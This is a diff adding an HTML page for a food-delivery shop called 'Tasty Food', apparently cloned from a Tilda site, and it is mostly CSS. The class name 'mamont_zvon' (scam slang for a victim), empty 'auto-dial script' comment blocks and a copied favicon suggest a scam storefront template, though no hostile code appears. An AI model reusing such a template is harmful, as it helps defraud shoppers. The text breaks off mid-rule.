@@ -1,0 +1,2398 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tasty Food — Доставка еды и продуктов</title>
+
+    <meta property="og:title" content="Tasty Food — Доставка еды и продуктов">
+    <meta property="og:description" content="">
+    <meta property="og:type" content="website">
+    <meta property="og:image"
+        content="data:image/png;base64,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">
+    <meta property="fb:app_id" content="257953674358265">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+    <link rel="dns-prefetch" href="https://tilda.ws/">
+    <link rel="dns-prefetch" href="https://static.tildacdn.com/">
+
+    <link rel="shortcut icon"
+        href="https://dostavka-edy-na-dom.ru/wp-content/uploads/2020/04/cropped-eda-na-dom-32x32.png"
+        type="image/png">
+    <link rel="stylesheet" href="/css/support_parent.css">
+    <!-- Assets -->
+    <link rel="stylesheet" href="/views/food/tilda-grid-3.css" type="text/css"
+        media="all">
+    <link rel="stylesheet" href="/views/food/tilda-blocks-2.css" type="text/css"
+        media="all">
+    <link rel="stylesheet" href="/views/food/tilda-animation-1.css"
+        type="text/css" media="all">
+    <link rel="stylesheet" href="/views/food/tilda-popup-1.css" type="text/css"
+        media="all">
+    <link rel="stylesheet" href="/views/food/tilda-slds-1.css" type="text/css"
+        media="all">
+    <link rel="stylesheet" href="/views/food/tilda-zoom-2.css" type="text/css"
+        media="all">
+    <script type="text/javascript" charset="utf-8" async=""
+        src="/views/food/loader.js"></script>
+    <script src="/views/food/jquery-1.js"></script>
+    <script src="/views/food/tilda-scripts-2.js"></script>
+    <script src="/views/food/tilda-blocks-2.js"></script>
+    <script src="/views/food/lazyload-1.js" charset="utf-8"></script>
+    <script src="/views/food/tilda-animation-1.js" charset="utf-8"></script>
+    <script src="/views/food/hammer.js" charset="utf-8"></script>
+    <script src="/views/food/tilda-slds-1.js" charset="utf-8"></script>
+    <script src="/views/food/tilda-products-1.js" charset="utf-8"></script>
+    <script src="/views/food/tilda-zoom-2.js" charset="utf-8"></script>
+    <script src="/views/food/tilda-cart-1.js" charset="utf-8"></script>
+    <script type="text/javascript">
+        window.dataLayer = window.dataLayer || [];
+    </script>
+    <style>
+        /* слой затемнения */
+        .btn {
+            background-color: rgb(86, 173, 210);
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+            border-bottom-right-radius: 5px;
+            border-bottom-left-radius: 5px;
+            border-style: solid;
+            border-top-width: 1px;
+            border-bottom-width: 1px;
+            border-left-width: 1px;
+            border-right-width: 1px;
+            border-color: rgb(50, 146, 187);
+            padding-top: 6px;
+            padding-bottom: 6px;
+            padding-left: 12px;
+            padding-right: 12px;
+            font-size: 14px;
+            color: rgb(255, 255, 255)
+        }
+
+        .button {
+            text-transform: uppercase;
+            text-align: center;
+            color: #fff;
+            background-color: #2c2c2c;
+            width: 100px;
+            height: 50px;
+            ;
+        }
+
+        .btn-primary {
+            margin-top: 40px;
+            height: 30px;
+
+            padding-left: 7px;
+            border-radius: 4px;
+            border: 1px solid #ACA4A4;
+            cursor: pointer;
+            background-color: rgb(86, 173, 210);
+            color: #000 !important;
+        }
+
+
+        .labelknopka {
+            background-color: #028fcc;
+            padding: 15px;
+            color: white;
+            font-size: 14p;
+            font-family: arial;
+            border-radius: 11px 11px 0px 0px;
+            border: 1px solid white;
+            font-weight: bold;
+            z-index: 9999;
+            position: absolute;
+            bottom: 0;
+        }
+
+        .form-control {
+            float: right;
+            margin-left: 20px;
+        }
+
+        .form-group {
+            padding-top: 40px;
+        }
+
+
+
+        label {
+            cursor: pointer;
+
+
+        }
+
+        .mamont_zvon {
+
+
+            display: block;
+
+            z-index: 99999;
+            bottom: 20px;
+            position: fixed;
+            left: 15%;
+
+        }
+
+        .mamont_zvon:hover {
+            background-color: blue;
+        }
+
+        .mamont_zvon a {
+            font-size: 18px;
+            color: white;
+            text-decoration: none;
+            font-family: arial;
+            padding: 0;
+
+        }
+
+        .mamont_zvon p {
+            color: white;
+            padding: 0;
+            margin: 0;
+            padding-top: 5px;
+
+            font-family: sans-serif;
+            font-size: 14px;
+        }
+
+        .dm-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: rgba(0, 0, 0, 0.65);
+            display: none;
+            overflow: auto;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+        }
+
+        /* активируем слой затемнения и модальное окно */
+        .dm-overlay:target {
+            display: block;
+            /* анимация и время задержки */
+            -webkit-animation: fade .6s;
+            -moz-animation: fade .6s;
+            animation: fade .6s;
+        }
+
+        /* блочная таблица */
+        .dm-table {
+            display: table;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* ячейка блочной таблицы */
+        .dm-cell {
+            display: table-cell;
+            padding: 0 1em;
+            vertical-align: middle;
+            text-align: center;
+        }
+
+        /* модальный блок */
+        .dm-modal {
+
+            display: inline-block;
+            padding: 20px;
+            /* максимально возможная ширина */
+
+            background: #607d8b;
+            /* внешняя тень блока */
+            -webkit-box-shadow: 0px 15px 20px rgba(0, 0, 0, 0.22), 0px 19px 60px rgba(0, 0, 0, 0.3);
+            -moz-box-shadow: 0px 15px 20px rgba(0, 0, 0, 0.22), 0px 19px 60px rgba(0, 0, 0, 0.3);
+            box-shadow: 0px 15px 20px rgba(0, 0, 0, 0.22), 0px 19px 60px rgba(0, 0, 0, 0.3);
+            color: #cfd8dc;
+            text-align: left;
+            /* анимация и время задержки */
+            -webkit-animation: fade .8s;
+            -moz-animation: fade .8s;
+            animation: fade 1.8s;
+        }
+
+
+        /* анимация при появлении затемнения и блоков с содержанием */
+        @-moz-keyframes fade {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        @-webkit-keyframes fade {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        @keyframes fade {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        /* рисуем кнопарь закрытия */
+
+        .close {
+            z-index: 9999;
+            float: right;
+            width: 30px;
+            height: 30px;
+            color: #cfd8dc;
+            text-align: center;
+            text-decoration: none;
+            line-height: 26px;
+            cursor: pointer;
+        }
+
+        .close:after {
+            display: block;
+            border: 2px solid #cfd8dc;
+            -webkit-border-radius: 50%;
+            -moz-border-radius: 50%;
+            border-radius: 50%;
+            content: 'X';
+            -webkit-transition: all 0.6s;
+            -moz-transition: all 0.6s;
+            transition: all 0.6s;
+            -webkit-transform: scale(0.85);
+            -moz-transform: scale(0.85);
+            -ms-transform: scale(0.85);
+            transform: scale(0.85);
+        }
+
+        /* кнопка закрытия при наведении */
+
+        .close:hover:after {
+            border-color: #fff;
+            color: #fff;
+            -webkit-transform: scale(1);
+            -moz-transform: scale(1);
+            -ms-transform: scale(1);
+            transform: scale(1);
+        }
+    </style>
+</head>
+<!--Скрипт автодозвона-->
+
+
+
+
+<!--Автодозвон-->
+
+
+<body class="t-body" style="margin:0;">
+    <div id="chat-application"
+        style="display: block; z-index: 2147483647; position: fixed; overflow: hidden; bottom: 24px; left: initial; right: 11px; max-height: 65px; max-width: 113px; height: 65px; width: 113px; background: transparent none repeat scroll 0% 0%;">
+        <iframe id="chat-application-iframe" title="Smartsupp"
+            aria-hidden="true"
+            style="width: 100%; height: 100%; border: medium none; position: absolute; left: 0px; z-index: 10000001;"></iframe>
+    </div>
+    <!--allrecords-->
+    <div id="allrecords" class="t-records"
+        data-hook="blocks-collection-content-node"
+        data-tilda-project-id="660965" data-tilda-page-id="4354600"
+        data-tilda-page-alias="food"
+        data-tilda-formskey="e62e96154db33753c66bbc683343f744">
+        <div id="rec79851894" class="r t-rec" style=" "
+            data-animationappear="off" data-record-type="205">
+            <style type="text/css" id="t826__galaxy-rec79851894">
+                @keyframes t826__galaxy-rec79851894 {
+                    to {
+                        transform: translateY(-955px);
+                    }
+                }
+
+                .t826__galaxy-near-rec79851894:after,
+                .t826__galaxy-near-rec79851894 {
+                    box-shadow: 752px 1633px rgba(255, 255, 255, 0.70), 873px 519px rgba(255, 255, 255, 0.70), 873px 1474px rgba(255, 255, 255, 0.70), 447px 11px rgba(255, 255, 255, 0.70), 447px 966px rgba(255, 255, 255, 0.70), 1271px 82px rgba(255, 255, 255, 0.70), 1271px 1037px rgba(255, 255, 255, 0.70), 1336px 348px rgba(255, 255, 255, 0.70), 1336px 1303px rgba(255, 255, 255, 0.70), 1235px 22px rgba(255, 255, 255, 0.70), 1235px 977px rgba(255, 255, 255, 0.70), 1746px 274px rgba(255, 255, 255, 0.70), 1746px 1229px rgba(255, 255, 255, 0.70), 1821px 97px rgba(255, 255, 255, 0.70), 1821px 1052px rgba(255, 255, 255, 0.70), 1077px 874px rgba(255, 255, 255, 0.70), 1077px 1829px rgba(255, 255, 255, 0.70), 1878px 152px rgba(255, 255, 255, 0.70), 1878px 1107px rgba(255, 255, 255, 0.70), 1048px 547px rgba(255, 255, 255, 0.70), 1048px 1502px rgba(255, 255, 255, 0.70), 1405px 810px rgba(255, 255, 255, 0.70), 1405px 1765px rgba(255, 255, 255, 0.70), 841px 907px rgba(255, 255, 255, 0.70), 841px 1862px rgba(255, 255, 255, 0.70), 1303px 359px rgba(255, 255, 255, 0.70), 1303px 1314px rgba(255, 255, 255, 0.70), 1862px 365px rgba(255, 255, 255, 0.70), 1862px 1320px rgba(255, 255, 255, 0.70), 1108px 321px rgba(255, 255, 255, 0.70), 1108px 1276px rgba(255, 255, 255, 0.70), 472px 559px rgba(255, 255, 255, 0.70), 472px 1514px rgba(255, 255, 255, 0.70), 1174px 214px rgba(255, 255, 255, 0.70), 1174px 1169px rgba(255, 255, 255, 0.70), 1086px 539px rgba(255, 255, 255, 0.70), 1086px 1494px rgba(255, 255, 255, 0.70), 1746px 154px rgba(255, 255, 255, 0.70), 1746px 1109px rgba(255, 255, 255, 0.70), 1309px 763px rgba(255, 255, 255, 0.70), 1309px 1718px rgba(255, 255, 255, 0.70), 516px 92px rgba(255, 255, 255, 0.70), 516px 1047px rgba(255, 255, 255, 0.70), 1168px 955px rgba(255, 255, 255, 0.70), 1168px 1910px rgba(255, 255, 255, 0.70), 1713px 39px rgba(255, 255, 255, 0.70), 1713px 994px rgba(255, 255, 255, 0.70), 1756px 897px rgba(255, 255, 255, 0.70), 1756px 1852px rgba(255, 255, 255, 0.70), 792px 539px rgba(255, 255, 255, 0.70), 792px 1494px rgba(255, 255, 255, 0.70), 211px 404px rgba(255, 255, 255, 0.70), 211px 1359px rgba(255, 255, 255, 0.70), 1506px 229px rgba(255, 255, 255, 0.70), 1506px 1184px rgba(255, 255, 255, 0.70), 1324px 318px rgba(255, 255, 255, 0.70), 1324px 1273px rgba(255, 255, 255, 0.70), 1686px 938px rgba(255, 255, 255, 0.70), 1686px 1893px rgba(255, 255, 255, 0.70), 1029px 507px rgba(255, 255, 255, 0.70), 1029px 1462px rgba(255, 255, 255, 0.70), 252px 574px rgba(255, 255, 255, 0.70), 252px 1529px rgba(255, 255, 255, 0.70), 971px 529px rgba(255, 255, 255, 0.70), 971px 1484px rgba(255, 255, 255, 0.70), 1827px 442px rgba(255, 255, 255, 0.70), 1827px 1397px rgba(255, 255, 255, 0.70), 797px 913px rgba(255, 255, 255, 0.70), 797px 1868px rgba(255, 255, 255, 0.70), 1036px 204px rgba(255, 255, 255, 0.70), 1036px 1159px rgba(255, 255, 255, 0.70), 338px 855px rgba(255, 255, 255, 0.70), 338px 1810px rgba(255, 255, 255, 0.70), 916px 221px rgba(255, 255, 255, 0.70), 916px 1176px rgba(255, 255, 255, 0.70), 1432px 726px rgba(255, 255, 255, 0.70), 1432px 1681px rgba(255, 255, 255, 0.70), 480px 245px rgba(255, 255, 255, 0.70), 480px 1200px rgba(255, 255, 255, 0.70), 1157px 277px rgba(255, 255, 255, 0.70), 1157px 1232px rgba(255, 255, 255, 0.70), 1762px 465px rgba(255, 255, 255, 0.70), 1762px 1420px rgba(255, 255, 255, 0.70), 246px 446px rgba(255, 255, 255, 0.70), 246px 1401px rgba(255, 255, 255, 0.70), 1811px 371px rgba(255, 255, 255, 0.70), 1811px 1326px rgba(255, 255, 255, 0.70), 106px 69px rgba(255, 255, 255, 0.70), 106px 1024px rgba(255, 255, 255, 0.70), 1161px 376px rgba(255, 255, 255, 0.70), 1161px 1331px rgba(255, 255, 255, 0.70), 418px 611px rgba(255, 255, 255, 0.70), 418px 1566px rgba(255, 255, 255, 0.70), 427px 699px rgba(255, 255, 255, 0.70), 427px 1654px rgba(255, 255, 255, 0.70), 640px 338px rgba(255, 255, 255, 0.70), 640px 1293px rgba(255, 255, 255, 0.70);
+                    animation-duration: 24s;
+                    animation-name: t826__galaxy-rec79851894
+                }
+
+                .t826__galaxy-near-rec79851894:after {
+                    content: ' ';
+                    position: absolute;
+                    top: 955px
+                }
+
+                .t826__galaxy-mid-rec79851894:after,
+                .t826__galaxy-mid-rec79851894 {
+                    box-shadow: 796px 1433px rgba(255, 255, 255, 0.70), 1199px 303px rgba(255, 255, 255, 0.70), 1199px 1258px rgba(255, 255, 255, 0.70), 1088px 37px rgba(255, 255, 255, 0.70), 1088px 992px rgba(255, 255, 255, 0.70), 876px 117px rgba(255, 255, 255, 0.70), 876px 1072px rgba(255, 255, 255, 0.70), 1171px 646px rgba(255, 255, 255, 0.70), 1171px 1601px rgba(255, 255, 255, 0.70), 288px 680px rgba(255, 255, 255, 0.70), 288px 1635px rgba(255, 255, 255, 0.70), 1260px 81px rgba(255, 255, 255, 0.70), 1260px 1036px rgba(255, 255, 255, 0.70), 502px 769px rgba(255, 255, 255, 0.70), 502px 1724px rgba(255, 255, 255, 0.70), 1007px 615px rgba(255, 255, 255, 0.70), 1007px 1570px rgba(255, 255, 255, 0.70), 61px 651px rgba(255, 255, 255, 0.70), 61px 1606px rgba(255, 255, 255, 0.70), 1208px 582px rgba(255, 255, 255, 0.70), 1208px 1537px rgba(255, 255, 255, 0.70), 30px 127px rgba(255, 255, 255, 0.70), 30px 1082px rgba(255, 255, 255, 0.70), 1332px 394px rgba(255, 255, 255, 0.70), 1332px 1349px rgba(255, 255, 255, 0.70), 105px 29px rgba(255, 255, 255, 0.70), 105px 984px rgba(255, 255, 255, 0.70), 1304px 344px rgba(255, 255, 255, 0.70), 1304px 1299px rgba(255, 255, 255, 0.70), 1697px 576px rgba(255, 255, 255, 0.70), 1697px 1531px rgba(255, 255, 255, 0.70), 1371px 335px rgba(255, 255, 255, 0.70), 1371px 1290px rgba(255, 255, 255, 0.70), 162px 119px rgba(255, 255, 255, 0.70), 162px 1074px rgba(255, 255, 255, 0.70), 140px 685px rgba(255, 255, 255, 0.70), 140px 1640px rgba(255, 255, 255, 0.70), 1243px 720px rgba(255, 255, 255, 0.70), 1243px 1675px rgba(255, 255, 255, 0.70), 359px 234px rgba(255, 255, 255, 0.70), 359px 1189px rgba(255, 255, 255, 0.70), 1629px 489px rgba(255, 255, 255, 0.70), 1629px 1444px rgba(255, 255, 255, 0.70), 808px 633px rgba(255, 255, 255, 0.70), 808px 1588px rgba(255, 255, 255, 0.70), 527px 565px rgba(255, 255, 255, 0.70), 527px 1520px rgba(255, 255, 255, 0.70), 198px 507px rgba(255, 255, 255, 0.70), 198px 1462px rgba(255, 255, 255, 0.70), 717px 914px rgba(255, 255, 255, 0.70), 717px 1869px rgba(255, 255, 255, 0.70), 849px 123px rgba(255, 255, 255, 0.70), 849px 1078px rgba(255, 255, 255, 0.70), 1669px 603px rgba(255, 255, 255, 0.70), 1669px 1558px rgba(255, 255, 255, 0.70), 838px 166px rgba(255, 255, 255, 0.70), 838px 1121px rgba(255, 255, 255, 0.70), 1432px 634px rgba(255, 255, 255, 0.70), 1432px 1589px rgba(255, 255, 255, 0.70), 240px 388px rgba(255, 255, 255, 0.70), 240px 1343px rgba(255, 255, 255, 0.70), 371px 654px rgba(255, 255, 255, 0.70), 371px 1609px rgba(255, 255, 255, 0.70), 634px 781px rgba(255, 255, 255, 0.70), 634px 1736px rgba(255, 255, 255, 0.70), 1321px 542px rgba(255, 255, 255, 0.70), 1321px 1497px rgba(255, 255, 255, 0.70), 1252px 198px rgba(255, 255, 255, 0.70), 1252px 1153px rgba(255, 255, 255, 0.70), 720px 718px rgba(255, 255, 255, 0.70), 720px 1673px rgba(255, 255, 255, 0.70), 1783px 312px rgba(255, 255, 255, 0.70), 1783px 1267px rgba(255, 255, 255, 0.70), 1903px 249px rgba(255, 255, 255, 0.70), 1903px 1204px rgba(255, 255, 255, 0.70), 1216px 408px rgba(255, 255, 255, 0.70), 1216px 1363px rgba(255, 255, 255, 0.70), 1507px 659px rgba(255, 255, 255, 0.70), 1507px 1614px rgba(255, 255, 255, 0.70), 1095px 262px rgba(255, 255, 255, 0.70), 1095px 1217px rgba(255, 255, 255, 0.70), 465px 792px rgba(255, 255, 255, 0.70), 465px 1747px rgba(255, 255, 255, 0.70), 8px 783px rgba(255, 255, 255, 0.70), 8px 1738px rgba(255, 255, 255, 0.70), 1858px 823px rgba(255, 255, 255, 0.70), 1858px 1778px rgba(255, 255, 255, 0.70), 355px 315px rgba(255, 255, 255, 0.70), 355px 1270px rgba(255, 255, 255, 0.70), 1105px 238px rgba(255, 